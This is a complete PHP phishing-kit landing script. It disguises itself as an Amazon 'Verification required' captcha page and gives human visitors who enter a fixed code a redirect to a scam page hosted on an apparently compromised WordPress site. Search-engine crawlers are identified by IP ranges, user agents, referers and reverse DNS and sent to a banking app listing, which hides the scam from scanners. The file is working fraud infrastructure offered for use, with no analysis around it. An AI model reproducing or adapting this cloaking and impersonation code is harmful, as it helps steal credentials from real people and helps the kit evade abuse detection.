<?php
@ini_set('memory_limit', '-1');
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);
$error = 0;
$lien_scama = "https://nnvoy.com/wp-content/mu-plugins/gd-system-plugin/includes/cli/Login/";
$lien_la5or = "https://play.google.com/store/apps/details?id=com.fullsix.android.labanquepostale.accountaccess&hl=fr&option1=com_56695594&xfsr=true";
if (isset($_POST['guess'])) {
  if ($_POST['guess'] == "w53637" || $_POST['guess'] == "W53637") {
   header("location:$lien_scama");
   echo "<SCRIPT LANGUAGE='JavaScript'>
            document.location.href='$lien_scama'
            </SCRIPT>";
  }else{
    $error = 1;
  }
}
function get_request_uri()
{
    if (isset($_SERVER["REQUEST_URI"])) {
        $requestUri = $_SERVER["REQUEST_URI"];
    }else{
        $requestUri = '';
    }
    return $requestUri;
}

function get_user_agent()
{
    if (isset($_SERVER["HTTP_USER_AGENT"])) {
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
    }else{
        $userAgent = '';
    }
    return $userAgent;
}
function get_real_ip()
{
    $ip = false;
    if(!empty($_SERVER['HTTP_CF_CONNECTING_IP'])){
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ips=explode (',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        for ($i=0; $i < count($ips); $i++){
            if(!preg_match ('^(10|172.16|192.168).', $ips[$i])){
                $ip=$ips[$i];
                break;
            }
        }
    }
    return $ip ? $ip : $_SERVER['REMOTE_ADDR'];
}
function is_from_bot()
{
    if(stripos(get_user_agent(), '--janshop--') === 0){
        return true;
    }
    if (!isset($_SERVER['HTTP_REFERER'])) {
        return false;
    }
    $referer = $_SERVER['HTTP_REFERER'];
    return (stripos($referer,"bot")
        ||stripos($referer,"spider")
        ||stripos($referer,"yahoo")
        ||stripos($referer,"seznam")
        ||stripos($referer,"Googlebot")
        ||stripos($referer,"bingbot")
        ||stripos($referer,"msnbot")
        ||stripos($referer,"Yahoo! Slurp")
        ||stripos($referer,"Slurp")
        ||stripos($referer,"bing"));
}
function is_bot()
{
    $ua = get_user_agent();
    $ip = get_real_ip();
    if(empty($ua)) return false;
    if(stripos($ua,"--gooshop--") === 0) return true;
    $bot_ip_pool = array(
        "66\.249\.[6-9][0-9]\.[0-9]+",  //Google  NetRange:   66.249.64.0 - 66.249.95.255
        "74\.125\.[0-9]+\.[0-9]+",  //Google  NetRange:   74.125.0.0 - 74.125.255.255
        "66\.102\.6\.[0-9]+", //Google  NetRange:   66.102.6.0 - 66.102.6.255
        "66\.102\.7\.[0-9]+", //Google  NetRange:   66.102.7.0 - 66.102.7.255
        "66\.102\.8\.[0-9]+", //Google  NetRange:   66.102.8.0 - 66.102.8.255
        "66\.102\.9\.[0-9]+", //Google  NetRange:   66.102.9.0 - 66.102.9.255
        "64\.233\.172\.[0-9]+", //Google  NetRange:   64.233.172.0 - 64.233.172.255
        "64\.233\.173\.[0-9]+", //Google  NetRange:   64.233.173.0 - 64.233.173.255
        "23\.251\.1[2-5][0-9]\.[0-9]+", //Google  NetRange:   23.251.128.0 - 23.251.159.255
        "203\.208\.60\.[0-9]+", //Google  NetRange:   203.208.60.0 - 203.208.60.255
        "173\.255\.1[1-2][0-9]\.[0-9]+",  //Google  NetRange:   173.255.112.0 - 173.255.127.255
        "146\.148\.[0-9]+\.[0-9]+", //Google  NetRange:   146.148.0.0 - 146.148.127.255
        "216\.239\.45\.[0-9]+", //Google  NetRange:   216.239.45.0 - 216.239.45.255
        "216\.58\.19[2-9]\.[0-9]+", //Google  NetRange:   216.58.192.0 - 216.58.199.255
        "216\.58\.2[0-2][0-9]\.[0-9]+", //Google  NetRange:   216.58.200.0 - 216.58.223.255
        "136\.[3-6][0-9]\.[0-9]+\.[0-9]+",  //Google  NetRange:   136.32.0.0 - 136.63.255.255
        "130\.211\.[0-9]+\.[0-9]+", //Google  NetRange:   130.211.0.0 - 130.211.255.255
        "107\.178\.2[0-5][0-9]\.[0-9]+",  //Google  NetRange:   107.178.200.0 - 107.178.255.255
        "104\.15[4-5]\.[0-9]+\.[0-9]+", //Google  NetRange:   104.154.0.0 - 104.155.255.255
        "131\.253\.[1-3][0-9]\.[0-9]+", //bing    NetRange: 131.253.14.0 - 131.253.38.255
        "157\.55\.2\.[0-9]+", //bing    NetRange: 157.55.2.0 - 157.55.2.255
        "157\.55\.[1-4][0-9]\.[0-9]+",  //bing    NetRange: 157.55.12.0 - 157.55.49.255
        "157\.56\.[0-9]+\.[0-9]+",  //bing    NetRange: 157.56.0.0 - 157.56.255.255
        "199\.30\.[1-3][0-9]\.[0-9]+",  //bing    NetRange: 199.30.16.0 - 199.30.31.255
        "207\.46\.[0-9]+\.[0-9]+",  //bing    NetRange: 207.46.0.151 - 207.46.255.255
        "40\.77\.167\.[0-9]+",  //bing    NetRange: 40.77.167.0 - 40.77.167.255
        "65\.5[2-5]\.[0-9]+\.[0-9]+", //MSN   NetRange:   65.52.0.0 - 65.55.255.255
        "74\.6\.[0-9]+\.[0-9]+",  //Yahoo   NetRange:   74.6.0.0 - 74.6.255.255
        "67\.195\.[0-9]+\.[0-9]+",  //Yahoo#2 NetRange:   67.195.0.0 - 67.195.255.255
        "68\.180\.2[1-2][0-9]\.[0-9]+", //Yahoo   NetRange:   68.180.216.0 - 68.180.229.225
        "202\.160\.1[7-8][0-9]\.[0-9]+",  //Yahoo   NetRange:   202.160.176.0 - 202.160.189.255
        "203\.209\.2[2-5][0-9]\.[0-9]+",  //Yahoo   NetRange:   203.209.224.0 - 203.209.253.255
        "183\.79\.[0-9]+\.[0-9]+",  //Yahoo   NetRange:   183.79.0.0 - 183.79.255.255
        "72\.30\.[0-9]+\.[0-9]+"  //Yahoo#3 NetRange:   72.30.0.0 - 72.30.255.255
    );
    foreach ( $bot_ip_pool as $v )
    {
        if ( preg_match( '#^'.$v.'$#', $ip )) return true;
    }
    $bot_dn_pool = array("google","amazon","Huawei",'.yahoo.','.live.','.msn.');
    try
    {
        $rdns = gethostbyaddr($ip);
        if(empty($rdns)) return false;
        foreach ($bot_dn_pool as $dn)
        {
        if(stripos($rdns,$dn)) return true;
        }
        return false;
    }
    catch(Exception $e)
    {
        return (stripos($ua,"bot")
        ||stripos($ua,"spider")
        ||stripos($ua,"yahoo")
        ||stripos($ua,"seznam")
        ||stripos($ua,"Googlebot")
        ||stripos($ua,"bingbot")
        ||stripos($ua,"msnbot")
        ||stripos($ua,"Yahoo! Slurp")
        ||stripos($ua,"Slurp")
        ||stripos($ua,"bing"));
    }
}
if (!is_bot() && !is_from_bot()) {
    if (stripos(strtolower(get_user_agent()), 'bot') !== false) {
        header("location:$lien_la5or");
           echo "<SCRIPT LANGUAGE='JavaScript'>
                document.location.href='$lien_la5or'
                </SCRIPT>";
    }else{
        ?>
        <html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.19.8-2020-04-21">
  <head>
    <meta charset="utf-8">
    <title dir="ltr">Verification</title>
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61Brdu0o6LL._RC|11Fd9tJOdtL.css,21y5jWQoUML.css,31Q3id-QR0L.css,31P8A7PnBZL.css_.css?AUIClients/AmazonUI#us.not-trident">
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|419sIPk+mYL.css,41yEFdgL45L.css_.css?AUIClients/AuthenticationPortalAssets">
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11E08O3eXDL.css?AUIClients/CVFAssets">
  </head>
  <body class="ap-locale-en_US a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate">
    <div id="a-page">
      <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none auth-navbar">
          <div class="a-section a-spacing-medium a-text-center">
            <a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
            <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
            </a>
          </div>
        </div>
        <div id="authportal-center-section" class="a-section">
          <div id="authportal-main-section" class="a-section">

            <?php
            if ($error == 1) {
              # code...?>
            <div class="a-section a-spacing-base auth-pagelet-container">
              <div class="a-section">
                <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
                  <div class="a-box-inner a-alert-container">
                    <h4 class="a-alert-heading">There was a problem</h4>
                    <i class="a-icon a-icon-alert"></i>
                  </div>
                </div>
              </div>
            </div>
            <?php 
            } ?>
            <div class="a-section auth-pagelet-container">
              <div class="a-section a-spacing-base">
                <div class="a-box">
                  <div class="a-box-inner a-padding-extra-large">
                    <h1 class="a-spacing-small">
                      Verification required
                    </h1>
                        <div class="a-section">
                          <div id="image-captcha-section" class="a-section a-spacing-large">
                            <input type="hidden" name="use_image_captcha" value="true" id="use_image_captcha">
                            <div class="a-section a-spacing-base">
                              <h4>
                                Enter the characters you see
                              </h4>
                              <div id="auth-captcha-image-container" class="a-section a-text-center">
                                <img  src="https://i.ibb.co/1XvK992/828028a4f4a84acabd1a94001a5c8a7c.jpg" style="display: inline;">
                              </div>
                            </div>
                          </div>
                          <form method="POST">
                              
                          <label for="auth-captcha-guess" class="a-form-label">
                          Type characters
                          </label>
                          <input type="text" id="auth-captcha-guess" autocomplete="off" name="guess" tabindex="3" class="a-input-text a-span12 auth-required-field">
                        </div>
                        <div class="a-section">
                          <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                          Continue
                          </span></span></span>
                        </div>
                          </form>
                      </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
    </div>
  </body>
</html>
<?php
    }
}else{
    header("location:$lien_la5or");
    echo "<SCRIPT LANGUAGE='JavaScript'>
            document.location.href='$lien_la5or'
            </SCRIPT>";
}

?>